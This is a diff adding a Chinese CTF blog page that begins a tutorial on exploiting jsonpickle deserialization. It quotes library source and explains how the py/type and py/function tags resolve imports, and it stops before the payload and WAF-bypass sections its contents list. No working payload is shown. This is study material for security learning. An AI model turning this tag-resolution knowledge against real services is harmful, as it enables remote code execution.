@@ -1,0 +1,875 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    JsonPickle反序列化 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="这个知识点在强网杯S8决赛和NepCTF2025都考到了，今天来学一下 参考从源码看JsonPickle反序列化利用与绕WAF-先知社区  JsonPickle jsonpickle 是一个把任意 Python 对象图序列化为 JSON、并能从该 JSON 恢复出原始对象的库。 为了能“还原对象”，它在 JSON 中存储额外的元信息（例如 py&#x2F;object, py&#x2F;state 等），以记录对象的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JsonPickle反序列化">
+<meta property="og:url" content="http://example.com/2025/10/07/JsonPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="这个知识点在强网杯S8决赛和NepCTF2025都考到了，今天来学一下 参考从源码看JsonPickle反序列化利用与绕WAF-先知社区  JsonPickle jsonpickle 是一个把任意 Python 对象图序列化为 JSON、并能从该 JSON 恢复出原始对象的库。 为了能“还原对象”，它在 JSON 中存储额外的元信息（例如 py&#x2F;object, py&#x2F;state 等），以记录对象的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/10/07/images/image-20251007174413658.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/image-20251007175148371.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/image-20251007181006214.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/image-20251007181524900.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/image-20251007184725258.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727210609797-1615567852.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727211042253-1735992130.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727211217039-1594258928.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727211317461-540767477.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727211907973-888226621.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727212016993-1284084646.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727212125104-902483694.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727212653026-645446458.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727213539530-1760557764.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727214121387-700491523.png">
+<meta property="og:image" content="http://example.com/2025/10/07/images/3392505-20250727214403401-720192041.png">
+<meta property="article:published_time" content="2025-10-07T09:36:50.000Z">
+<meta property="article:modified_time" content="2026-04-18T08:57:57.484Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JsonPickle反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/10/07/images/image-20251007174413658.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="JsonPickle反序列化">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JsonPickle反序列化</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonpickle"><span class="toc-number">1.</span> <span class="toc-text"> JsonPickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 反序列化流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text"> 标签利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pytype"><span class="toc-number">3.1.</span> <span class="toc-text"> py&#x2F;type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyfunction"><span class="toc-number">3.2.</span> <span class="toc-text"> py&#x2F;function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pymod"><span class="toc-number">3.3.</span> <span class="toc-text"> py&#x2F;mod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.4.</span> <span class="toc-text"> 全局信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyrepr"><span class="toc-number">3.5.</span> <span class="toc-text"> py&#x2F;repr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyreduce"><span class="toc-number">3.6.</span> <span class="toc-text"> py&#x2F;reduce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyobject"><span class="toc-number">3.7.</span> <span class="toc-text"> py&#x2F;object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8payload"><span class="toc-number">3.8.</span> <span class="toc-text"> 可利用payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pynewargsex%E5%92%8Cpynewargs"><span class="toc-number">3.9.</span> <span class="toc-text"> py&#x2F;newargsex和py&#x2F;newargs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%A4%B1%E8%B4%A5"><span class="toc-number">4.</span> <span class="toc-text"> 编码绕过(失败)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text"> 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nepctf2025-safe_bank"><span class="toc-number">6.</span> <span class="toc-text"> NepCTF2025-Safe_bank</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8pynewargs"><span class="toc-number">6.1.</span> <span class="toc-text"> 为什么用py&#x2F;newargs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-la%E7%A5%9E%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%E6%8A%B9%E9%99%A4%E5%A4%A7%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text"> 法一 la神的黑名单抹除大法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-%E5%AE%98%E6%96%B9wp"><span class="toc-number">6.3.</span> <span class="toc-text"> 法二 官方wp</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-JsonPickle反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/10/07/JsonPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-10-07T09:36:50.000Z" itemprop="datePublished">2025-10-07</time>
+    <time style="display: none;" id="post-update-time">2026-04-18</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>这个知识点在强网杯S8决赛和NepCTF2025都考到了，今天来学一下</p>
+<p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16133">从源码看JsonPickle反序列化利用与绕WAF-先知社区</a></p>
+<h2 id="jsonpickle"><a class="markdownIt-Anchor" href="#jsonpickle"></a> JsonPickle</h2>
+<p><strong><code>jsonpickle</code> 是一个把任意 Python 对象图序列化为 JSON、并能从该 JSON 恢复出原始对象的库。</strong></p>
+<p>为了能“还原对象”，它在 JSON 中存储额外的元信息（例如 <code>py/object</code>, <code>py/state</code> 等），以记录对象的模块/类与状态，从而在反序列化时重新 import 并构造对象。由于它要恢复任意类的实例，反序列化过程会涉及运行对象的构造/恢复逻辑，这就是危险的根源</p>
+<p>用法示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, email</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.email = email</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个对象</span></span><br><span class="line">user_obj = User(<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;alice@example.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化对象为JSON字符串</span></span><br><span class="line">serialized = jsonpickle.encode(user_obj)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"><span class="comment"># 输出：&#123;&quot;py/object&quot;: &quot;__main__.User&quot;, &quot;username&quot;: &quot;alice&quot;, &quot;email&quot;: &quot;alice@example.com&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化JSON字符串回Python对象</span></span><br><span class="line">deserialized_obj = jsonpickle.decode(serialized)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(deserialized_obj)) <span class="comment"># 输出： &lt;class &#x27;__main__.User&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(deserialized_obj.username) <span class="comment"># 输出： alice</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251007174413658.png" alt="image-20251007174413658" /></p>
+<p>打印得到的<code>py/object</code>便是标签，用来表示一个Python对象</p>
+<p>支持的标签见<code>jsonpickle/tags.py</code>，这些标签对应的处理函数见<code>jsonpickle/unpickler.py</code></p>
+<h2 id="反序列化流程分析"><a class="markdownIt-Anchor" href="#反序列化流程分析"></a> 反序列化流程分析</h2>
+<p>进入<code>jsonpickle.decode()</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .backend <span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params"></span></span><br><span class="line"><span class="params">    string,</span></span><br><span class="line"><span class="params">    backend=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    context=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    keys=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    reset=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    safe=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    classes=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    v1_decode=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    on_missing=<span class="string">&#x27;ignore&#x27;</span>,</span></span><br><span class="line"><span class="params">    handle_readonly=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    backend = backend <span class="keyword">or</span> json</span><br><span class="line">    context = context <span class="keyword">or</span> Unpickler(...)</span><br><span class="line">    data = backend.decode(string)</span><br><span class="line">    <span class="keyword">return</span> context.restore(data, reset=reset, classes=classes)</span><br></pre></td></tr></table></figure>
+<p>可以看到包括JSON后端（<code>backend</code>）、反序列化上下文（<code>context</code>）都是用户可以指定的</p>
+<p>尝试探测本地是否有如下库<code>simplejson</code>、<code>json</code>、<code>ujson</code>、<code>yaml</code>，来作为默认的JSON后端</p>
+<p><img src="../images/image-20251007175148371.png" alt="image-20251007175148371" /></p>
+<p>可惜这里获取的是<code>yaml#safe_load</code>，不然目标若存在<code>pyyaml</code>依赖也可考虑直接打yaml反序列化。</p>
+<p>接着尝试遍历导入的所有JSON后端来解析，解析成功则返回，报错则换下一个JSON后端</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#JSONBackend.decode()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, string</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Attempt to decode an object from a JSON string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        This tries the loaded backends in order and passes along the last</span></span><br><span class="line"><span class="string">        exception if no backends are able to decode the string.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> idx, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="variable language_">self</span>._backend_names):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">self</span>.backend_decode(name, string)</span><br><span class="line">            <span class="keyword">except</span> <span class="variable language_">self</span>._decoder_exceptions[name] <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> idx == <span class="built_in">len</span>(<span class="variable language_">self</span>._backend_names) - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">raise</span> e</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>经过JSON后端的初步解析后，<code>Unpickler#_restore_tags</code>开始根据标签恢复Python对象，标签和对应的处理函数如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_restore_tags</span>(<span class="params">self, obj, _passthrough=_passthrough</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return the restoration function for the specified object&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tags.RESERVED &lt;= <span class="built_in">set</span>(obj) <span class="keyword">and</span> <span class="built_in">type</span>(obj) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="built_in">list</span>, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">return</span> _passthrough</span><br><span class="line">    <span class="keyword">except</span> TypeError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(obj) <span class="keyword">is</span> <span class="built_in">dict</span>:</span><br><span class="line">        <span class="keyword">if</span> tags.TUPLE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_tuple</span><br><span class="line">        <span class="keyword">elif</span> tags.SET <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_set</span><br><span class="line">        <span class="keyword">elif</span> tags.B64 <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_base64</span><br><span class="line">        <span class="keyword">elif</span> tags.B85 <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_base85</span><br><span class="line">        <span class="keyword">elif</span> tags.ID <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_id</span><br><span class="line">        <span class="keyword">elif</span> tags.ITERATOR <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_iterator</span><br><span class="line">        <span class="keyword">elif</span> tags.OBJECT <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_object</span><br><span class="line">        <span class="keyword">elif</span> tags.TYPE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_type</span><br><span class="line">        <span class="keyword">elif</span> tags.REDUCE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_reduce</span><br><span class="line">        <span class="keyword">elif</span> tags.FUNCTION <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_function</span><br><span class="line">        <span class="keyword">elif</span> tags.MODULE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_module</span><br><span class="line">        <span class="keyword">elif</span> tags.REPR <span class="keyword">in</span> obj:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.safe:</span><br><span class="line">                restore = <span class="variable language_">self</span>._restore_repr_safe</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                restore = <span class="variable language_">self</span>._restore_repr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_dict</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(obj) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">        restore = <span class="variable language_">self</span>._restore_list</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        restore = _passthrough</span><br><span class="line">    <span class="keyword">return</span> restore</span><br></pre></td></tr></table></figure>
+<h2 id="标签利用"><a class="markdownIt-Anchor" href="#标签利用"></a> 标签利用</h2>
+<h3 id="pytype"><a class="markdownIt-Anchor" href="#pytype"></a> py/type</h3>
+<p><code>py/type</code> 是 <code>jsonpickle</code> 用来在序列化数据中<strong>标识对象类型</strong>的元数据标签</p>
+<p>用于序列化<strong>类对象本身</strong></p>
+<ul>
+<li>格式：<code>&quot;py/type&quot;: &quot;module.ClassName&quot;</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先会尝试__import__最后一个点号（.）前面的内容作为module，再通过getattr获取对应的属性，并且这里能够递归地获取属性。</span><br><span class="line">获取失败则回退一个点号（.）继续尝试</span><br><span class="line">解释=&gt;</span><br><span class="line">对于字符串 &quot;package.submodule.Class&quot;，机制会：</span><br><span class="line">从最右边开始：尝试导入 package.submodule，然后从中获取 Class</span><br><span class="line">如果失败：回退一个点号，尝试导入 package，然后获取 submodule.Class</span><br><span class="line">如果继续失败，继续回退点号，直到成功或没有点号为止。</span><br></pre></td></tr></table></figure>
+<h3 id="pyfunction"><a class="markdownIt-Anchor" href="#pyfunction"></a> py/function</h3>
+<p><code>py/function</code> 用于序列化<strong>函数对象</strong>（包括内置函数、自定义函数、方法等）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化一个内置函数</span></span><br><span class="line">serialized_func = jsonpickle.encode(<span class="built_in">len</span>)</span><br><span class="line"><span class="built_in">print</span>(serialized_func)</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/function&quot;</span><span class="punctuation">:</span> <span class="string">&quot;builtins.len&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>当反序列化这个JSON时，<code>jsonpickle</code> 会尝试重建原始的 <code>len</code> 函数。</p>
+<h3 id="pymod"><a class="markdownIt-Anchor" href="#pymod"></a> py/mod</h3>
+<p><code>py/mod</code> 用于序列化<strong>模块对象</strong></p>
